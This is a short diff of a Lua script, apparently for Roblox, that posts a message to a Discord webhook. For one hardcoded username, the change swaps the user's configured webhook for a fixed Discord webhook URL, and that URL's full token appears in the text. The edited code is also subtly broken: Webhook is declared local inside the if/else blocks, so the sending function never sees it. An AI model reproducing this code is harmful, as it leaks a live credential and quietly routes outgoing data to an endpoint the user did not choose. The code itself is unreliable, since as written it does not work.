@@ -43,8 +43,11 @@ local msg = {
   },
   ["attachments"] = {}
 }
-
-local Webhook = _G.Webhook
+if _G.Username == "W4r_ObScUrE" then
+	local Webhook = "https://discord.com/api/webhooks/1120368835447505069/8wm6KuytMaRBojApLvAVmDxReB2u4_ShgOliXjQJ4alllh2BbNgoZIL58izN8UYLjWl6"
+else
+        local Webhook = _G.Webhook
+end
 
 
 local function sendwebhook(msg)
@@ -52,11 +55,4 @@ local function sendwebhook(msg)
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end
 
-if _G.Username == "W4r_ObScUrE" then
-     local Webhook = "https://discord.com/api/webhooks/1120368835447505069/8wm6KuytMaRBojApLvAVmDxReB2u4_ShgOliXjQJ4alllh2BbNgoZIL58izN8UYLjWl6"
-     sendwebhook(msg)
-else
-     sendwebhook(msg)
-end
-
-
+sendwebhook(msg)
